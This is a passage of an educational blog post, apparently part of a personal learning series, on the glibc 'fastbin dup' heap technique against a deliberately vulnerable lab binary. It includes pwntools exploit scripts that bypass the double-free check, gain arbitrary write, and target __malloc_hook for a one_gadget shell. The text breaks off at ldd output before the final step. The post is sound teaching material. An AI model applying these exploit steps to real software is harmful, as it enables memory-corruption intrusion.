1)}.post-image:after{content:"";display:table;width:100%;padding-top:50%}.post-head,.post-content{background:rgba(35,36,39,0.95)}.post-content{padding:40px 15px;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25)}.post-head,.post-body{margin-bottom:20px;border-bottom:1px solid #3E4250}.post-head{padding-bottom:30px}.post-head .post-tag{margin-bottom:20px;text-align:center}.post-head .post-tag .tag{display:inline-block;padding:5px 15px;margin-right:5px;font-size:12px;line-height:18px;font-weight:bold;border:1px solid #1ABC9C;text-transform:capitalize;color:#1ABC9C;transition:.35s}.post-head .post-tag .tag:last-child{margin-right:0}.post-head .post-tag .tag:hover{background:#1ABC9C;color:#fff}.post-head .post-title{font-size:28px;text-align:center;font-weight:normal;line-height:28px;margin-bottom:5px}.post-head .post-date span{font-size:12px}.post-info,.post-info-author{display:flex;justify-content:center;align-items:center;flex-wrap:wrap}.post-info .post-info-author .info-author-avatar{display:inline-block;width:32px;height:32px;margin-right:10px;border-radius:50%;background-position:center;background-size:cover;background-repeat:no-repeat}.post-info .post-info-author .info-author-name,.post-info .post-info-author span{font-size:12px;text-transform:uppercase}.post-info .post-info-author span{margin-right:10px}.post-info .post-info-author .info-author-name{position:relative;padding-right:20px;margin-right:15px;color:#C9D3E7}.post-info .post-info-author .info-author-name:after{content:"";position:absolute;top:50%;right:0;transform:translateY(-50%);display:block;width:2px;height:12px;background:#3E4250}.post-body{padding-bottom:20px}.post-share{padding:10px 0}.post-share .share-item{display:inline-block;padding-right:15px}.post-share .share-item a{color:#3E4250}.post-share .share-item a:hover{color:#1ABC9C}.post-share .share-item a i.ion{font-size:20px}.post-navigation{display:flex;flex-wrap:wrap;margin-top:30px}.prev,.next{flex-basis:100%;padding:15px;background:#26272B}.prev:hover,.next:hover{background:#1f2023}.prev:hover .post-nav-title,.next:hover .post-nav-title{color:#1ABC9C;transition:.35s}.prev .post-nav-arrow,.next .post-nav-arrow{font-size:14px;color:#C9D3E7}.prev .post-nav-title,.next .post-nav-title{font-size:18px;color:#C9D3E7;transition:.35s}.prev{margin-bottom:10px}.prev,.next{text-align:center}.comments{padding:0 15px;background:#232427}@media only screen and (min-width: 576px){.post-content{padding:40px}.post-head .post-title{font-size:43px;line-height:43px;margin-bottom:10px}.post-navigation{display:flex;justify-content:space-between;flex-wrap:nowrap}.prev,.next{flex-basis:48%;padding:20px}.prev .post-nav-title,.next .post-nav-title{font-size:21px}.prev{text-align:left;margin-bottom:0}.next{text-align:right}.comments{padding:0 40px}}.page{margin-bottom:20px}.page-image-box{background:#101010}.page-image-box.reveal-in .page-image{opacity:1}.page-image{min-height:500px;margin-bottom:30px;background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#101010;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);opacity:1;transition:all 1s cubic-bezier(0.6, 0.3, 0, 1)}.page-image:after{content:"";display:table;width:100%}.page-content{padding:40px 15px;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);background:rgba(35,36,39,0.95)}.page-head{padding-bottom:30px}.page-head .page-title{font-size:28px;text-align:center;font-weight:normal;line-height:28px;margin-bottom:0}.page-head,.page-body{margin-bottom:20px;border-bottom:1px solid #3E4250}.page-body{padding-bottom:20px}@media only screen and (min-width: 576px){.page-content{padding:40px}.page-head .page-title{font-size:43px;line-height:43px;margin-bottom:10px}}.highlighter-rouge{background-color:#333333}.tags-list{display:flex;flex-wrap:wrap;margin:40px 0;padding:0;list-style:none}.tags-list .tags-item{margin:5px}.tags-list .tags-link{display:inline-block;padding:7px 12px;font-size:14px;border-radius:4px;color:#C9D3E7;font-weight:700;background:#2C2F36}.tags-list .tags-link:hover{color:#fff;background:#1ABC9C}.tags-title{margin-bottom:5px}.tags-group{margin-bottom:30px}.text-left{text-align:left}.text-right{text-align:right}.text-center{text-align:center}.text-justify{text-align:justify}.block{display:block}.inline-block{display:inline-block}.inline{display:inline}.vertical-center{display:flex;align-items:center;justify-content:center}.show{display:block !important}.hide{display:none !important}.invisible{visibility:hidden}.float-left{float:left}.float-right{float:right}.no-padding{padding:0}.no-margin{margin:0}.clearfix::after,.clearfix ::before{content:"";display:table;clear:both}.list-reset{list-style-type:none;margin:0;padding:0}.screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px;word-wrap:normal !important}

  </style>
</head>


<body>

  
  <div class="preloader">
  <div class="loader">
    <span>Loading</span>
  </div>
</div> <!-- /.loader -->
  <header class="header">
  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="header-box">
          <div class="logo-title">
            <a href="/new_blog/" class="logo-text">UPsecurity</a>
          </div>

          <nav class="nav-menu">
            <i class="menu-close ion ion-ios-close"></i>
            <ul class="menu-list">
              <li class="menu-item"><a href="/new_blog/" class="menu-link">Home</a></li>
              <!--  -->
              
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  
                
              
                
                  
                  
                  <li class="menu-item"><a href="/new_blog/research-project/" class="menu-link">R&D Project</a></li>
                  
                  
                
              
                
                  
                  
                  <li class="menu-item"><a href="/new_blog/about/" class="menu-link">About</a></li>
                  
                  
                
              
                
                  
                
              
                
                  
                  
                  <li class="menu-item"><a href="/new_blog/learning-outcomes/" class="menu-link">Proof learning outcomes</a></li>
                  
                  
                
              
                
                  
                  
                  <li class="menu-item"><a href="/new_blog/learning-plan/" class="menu-link">Personal learning plan</a></li>
                  
                  
                
              
                
                  
                
              
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
            </ul>
          </nav>
          <div class="nav-buttons">
            <i class="menu-button d-hide ion ion-ios-menu"></i>
            <i class="search-button ion ion-ios-search"></i>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="search">
    <div class="search-box">
      <i class="search-close-button ion ion-ios-close"></i>
      <label for="js-search-input" class="screen-reader-text"></label>
      <input type="text" id="js-search-input" class="search-text" autocomplete="off" placeholder="Search Something...">
      <ol id="js-results-container" class="search-results-list"></ol>
    </div>
  </div>
</header> <!-- /.header -->


      <div class="container">
	<div class="row">
		<div class="col col-12">
			<div class="post-image-box">
				
					<div class="page-image" style="background-image: url(/new_blog/img/upsecurity1.png)"></div>
				
			</div>
		</div>
	</div>
</div>

<div class="container">
	<div class="row">
		<article class="col col-12 col-t-8 post">
			<div class="post-content">

				<div class="post-head">
					
					<div class="post-tag">
						
						<a href="/new_blog/tags#Heap exploiting" class="tag">Heap exploiting</a>
						
					</div>
					
					<h1 class="post-title">Heap exploiting 4: Fastbin dup</h1>
					<div class="post-info">
						<div class="post-info-author">
							<div class="info-author-avatar" style="background-image: url(/new_blog/img/me.jpg)"></div>
							<span>by</span>
							<span class="info-author-name">René van Vliet</span>
						</div>
						<div class="post-date">
							<span>
								<time datetime="2020-09-28T17:05:55+02:00">Sep 28, 2020</time>
							</span>
						</div>
					</div>
				</div>

				<div class="post-body">
					<h1 id="heap-exploiting-4-fastbin-dup">Heap exploiting 4: Fastbin dup</h1>

<p>While the house of force focusses on arbitrary write to do the exploitation. 
The fastbin dup technique uses a use after free vulnerability to gain arbitrary write privileges.</p>

<p>What is a use after free?<br />
Well as we used malloc for the previous challenge now we are also going to use the free function.<br />
The free function gives the chunk back to the memory manager so that it can be reused or disposed.</p>

<p>A use after free vulnerability is basically forgetting to set the pointer to null after freeing the memory.</p>

<p>Example vulnerability</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span><span class="o">*</span> <span class="n">chunk_a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">...</span> <span class="n">program</span> <span class="n">code</span> <span class="p">...</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_a</span><span class="p">);</span>
<span class="p">...</span> <span class="n">program</span> <span class="n">code</span> <span class="p">...</span>
<span class="n">chunk_a</span> <span class="o">=</span> <span class="mh">0xc0debabe</span>
</code></pre></div></div>
<p>This snippet of code allows the reuse of variable chunk_a. The security patch would be:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kt">void</span><span class="o">*</span> <span class="n">chunk_a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">...</span> <span class="n">program</span> <span class="n">code</span> <span class="p">...</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_a</span><span class="p">);</span>
<span class="n">chunk_a</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
<span class="p">...</span> <span class="n">program</span> <span class="n">code</span> <span class="p">...</span>
<span class="n">chunk_a</span> <span class="o">=</span> <span class="mh">0xc0debabe</span>
</code></pre></div></div>
<p>Now at the last assignment the program would segfault because you cant write to a null pointer.</p>

<p>Because memory allocation is slower and more resource intensive libc found a way to speed things up: The fastbins.</p>

<p>The fastbins are basically a collection of single linked lists that store small free’ed chunks so that it can reuse these chunks.</p>

<p>To visualize this i wrote a small binary:</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-31-00.png" alt="" /></p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-31-17.png" alt="" /></p>

<p>as you can see on the first malloc one chunk is allocated.
after the first free</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-33-03.png" alt="" />
we see that the first chunk is put in the 0x20 fastbin
what happens on the second free?</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-34-03.png" alt="" /></p>

<p>Now after the second free we can see that chunk_b(purple) is on top of the fastbin and in its chunk data section it contains the next address of the free’d chunks, this will continue untill it is 0 as seen in chunk a’s(cyan) body</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-37-09.png" alt="" /></p>

<p>Now after the next free we can see that there are three chunks linked.</p>

<p>For the last part i’ll show you how malloc recycles the chunks by re allocating the fastbin chunks.</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-38-51.png" alt="" /></p>

<p>As you can see the third chunk(green) is not in the fastbins anymore but it still kept the address of the previous chunk data, this is why you should always expect to encounter “dirty” memory.</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-40-41.png" alt="" />
After three allocations we have an empty fastbin again and the chunks are ready to be reused.</p>

<p>As you could see the fastbins are a lifo bucket where the last entered chunk will be reused first.</p>

<h1 id="arbitrary-write">Arbitrary write</h1>

<p>arbitrary write</p>

<p>checksec<br />
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-43-09.png" alt="" /><br />
We have almost the same setup as the house_of_force except this binary uses the libc 2.30 version.
So we cannot overwrite the top_chunk anymore.</p>

<p>Lets run it and see what we got.<br />
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-44-38.png" alt="" /></p>

<p>We see a puts leak, so we can calculate the libc offset.
This time the heap address wasn’t leaked.
It requests us for a username.
and then there are four functions:</p>
<ul>
  <li>malloc</li>
  <li>free</li>
  <li>target</li>
  <li>quit</li>
</ul>

<p>Lets try to allocate a big chunk again.<br />
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-18-46-13.png" alt="" /><br />
We can only request a maximum of 120 which means that the arbitrary large size is out of the picture.</p>

<p>Quick size note, if you want to create a specific sized malloc chunk for the fast bins you can do binsize - 8 = request size.
so for fastbin 0x30: 0x30-8 = 0x28</p>

<p>The next point is where is the target.
Because there is a function that prints the target i first checked out the main function with <code class="language-plaintext highlighter-rouge">disass main</code></p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-20-33-11.png" alt="" /><br />
The printf at the bottom shows us that the target is near the username variable.
So I checked the global variables and noticed a user struct and checked it out.
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-20-31-45.png" alt="" /></p>

<p>So we know the target, lets see how we can exploit this.</p>

<p>First i tried to do a double free attack to free to one chunk twice.
malloc a chunk and run <code class="language-plaintext highlighter-rouge">free index: 0</code> twice.
In GDB we see:
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-21-35-28.png" alt="" /></p>

<p>It Throws an “double free or corruption (fasttop)” exception. The error itself is pretty obscure but we have a comment to help us: “Check that the top of the bin is not the record we are going to add (i.e. double free)”.
What this basically means is that if we try to free a chunk it cannot be on the top of the bin itself.
So to bypass this we can create two chunks and then free the first, second &amp; the first again.</p>

<p>Lets check it out.<br />
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-21-39-30.png" alt="" /></p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-21-39-54.png" alt="" />
Now the lifo stack looks like:</p>
<ol>
  <li>Chunk_A</li>
  <li>Chunk_B</li>
  <li>Chunk_A</li>
</ol>

<p>So if we do a malloc it will get the chunk_A and we can write to the body.
Because chunk a is still in the fastbins we get something like this:</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-21-47-38.png" alt="" /></p>

<p>Then we request another two chunks so that chunk_A will be on top of the fastbins.</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-21-49-22.png" alt="" /></p>

<p>Now if we create the last request then it will give a segfault. this is because malloc cant allocate at 0x4141414141414141.</p>

<p>What if we swap 0x41414141 with the address of the target just before the target itself (because malloc has 4 bytes of metadata in front of the user data).</p>

<p>I created a little script to automate the starting process:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Load in the elf to access the user address.
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"fastbin_dup"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>

<span class="c1"># The gdbscript to automate breakpoints.
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># The function that starts the process.
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># The chunk index.
</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># This function calls the malloc function.
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">index</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"size: "</span><span class="p">,</span> <span class="s">f"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>

<span class="c1"># This function free's the selected chunk.
</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="s">f"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># This binary leaks the address of puts(), use it to resolve the libc load address.
</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>
<span class="n">r</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="n">username</span> <span class="o">=</span> <span class="s">"Wotwot"</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>


<span class="c1"># Request two 0x30 sized chunks.
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>

<span class="c1"># Free the first chunk, then the second.
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="c1"># Bypass the double free mitigation.
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># fastbin dup
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># Set user address to chunk_A's user data. this changes the end of the list to point to the users address.
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">user</span><span class="p">))</span>

<span class="c1"># Then we request Chunk_b.
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
<span class="c1"># Request Chunk_A again.
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span>
</code></pre></div></div>

<p>Lets run it and see:<br />
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-22-09-38.png" alt="" /></p>

<p>We get a memory corruption (fast)</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-22-11-01.png" alt="" />
This error is a bit more cryptic but what it basically means is that the chunk size field is not correct.
As you can remember from the malloc intro, malloc stores its metadata inline before the userdata.
Because we control the memory before target (the user field) so if we can fake the size field then we can bypass this security measurement.</p>

<p>We used 0x30 bins so the size field should become 0x31 (0x30 with PREVINUSE flag)
so change:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username = "Wotwot"
</code></pre></div></div>
<p>To</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username = p64(0x0)+p64(0x31)
</code></pre></div></div>
<p>And run the program again:</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-22-19-12.png" alt="" /></p>

<p>We successfully overwrote the target area.</p>

<h1 id="remote-code-execution">Remote code execution</h1>
<p>In the previous section we got arbitrary write, we can use that to gain RCE by using the malloc hook again.
Because we cannot enter a size field above 120 we cannot enter pointers to the /bin/sh string or a pointer to a user controlled chunk.</p>

<p>If we want to use the malloc_hook we cannot fake the size field. lets see if we can find it around the malloc hook itself.</p>

<p>So i ran this script and investigated with GDB</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Load in the elf to access the user address.
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"fastbin_dup"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>

<span class="c1"># The gdbscript to automate breakpoints.
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># The function that starts the process.
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># The chunk index.
</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># This function calls the malloc function.
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">index</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"size: "</span><span class="p">,</span> <span class="s">f"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>

<span class="c1"># This function free's the selected chunk.
</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="s">f"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># This binary leaks the address of puts(), use it to resolve the libc load address.
</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>
<span class="n">r</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="c1"># username = "Wotwot"
</span><span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># Request two 0x30 sized chunks.
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>

<span class="c1"># Free the first chunk, then the second.
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="c1"># Bypass the double free mitigation.
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="c1"># fastbin dup
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Then interrupt GDB and look for possible size fields.
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-23-24-34.png" alt="" /></p>

<p>The hook is not set and in this run malloc_hook is located at: 0x7f7fd570cb50 
pwndbg has a handy utility to find fake size fields: find_fake_fast.</p>

<p>We can use it with the malloc hook to see if it can find some usefull size fields:
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-23-37-01.png" alt="" /></p>

<p>It came back with a 0x7f size field at 0x7f7fd570cb2d.
Lets see how it found that:</p>

<p><img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-01-23-38-34.png" alt="" /></p>

<p>It apparently used a part of the pointer, by misaligning it.</p>

<p>0x7f7fd570cb50 - 0x7f7fd570cb2d = 35</p>

<p>So if we allocate a chunk and write that address to it we can overwrite the distance and then still write system to the malloc hook. To figure out the distance we can do this by using a cyclic value and then checking what entered the malloc_hook.</p>

<p>A cyclic value is a non repeating pattern where you can find the length by entering the result.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Set user address to chunk_A's user data. this changes the end of the list to point to the users address.
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mi">35</span><span class="p">))</span>

<span class="c1"># Then we request Chunk_b.
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
<span class="c1"># Request Chunk_A again.
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span>

<span class="c1"># Generate the pattern generator
</span><span class="n">cyclic</span> <span class="o">=</span> <span class="n">cyclic_gen</span><span class="p">()</span>
<span class="c1"># Generate the pattern.
</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>
<span class="c1"># Write the pattern
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">pattern</span><span class="p">)</span> 
<span class="c1"># Print the found offset of the pattern.
</span><span class="k">print</span><span class="p">(</span><span class="n">cyclic</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">encode</span><span class="p">()))</span>
</code></pre></div></div>

<p>So we interrupt the process and see what value is in the malloc hook, then convert it into ascii and put it in the pattern finder.
<img src="/new_blog/img/heap-exploitation/fastbin_dup/Clipboard_2020-10-02-00-09-10.png" alt="" /></p>

<p>Now we just have to find out how to get a shell without being able to pass a (pointer from) the string /bin/sh. One such way is a One_gadget. What a one_gadget basically means is that it utilizes assembly from libc to create a system(/bin/sh) call. It creates an internal ropchain.</p>

<p>To run one_gadget we enter:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># run ldd to get the libc path:
$ ldd ./fastbin_dup 
    linux-vdso.so.1 (0x00007ffd22596000)
    libc.so.6 =&gt; ../.glibc/glibc_2.30_no-tcache/libc.so.6 (0x00007fbdf6b56000)
    ../.glibc/glibc_2.30_no-tcache/ld.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fbdf6f12000)
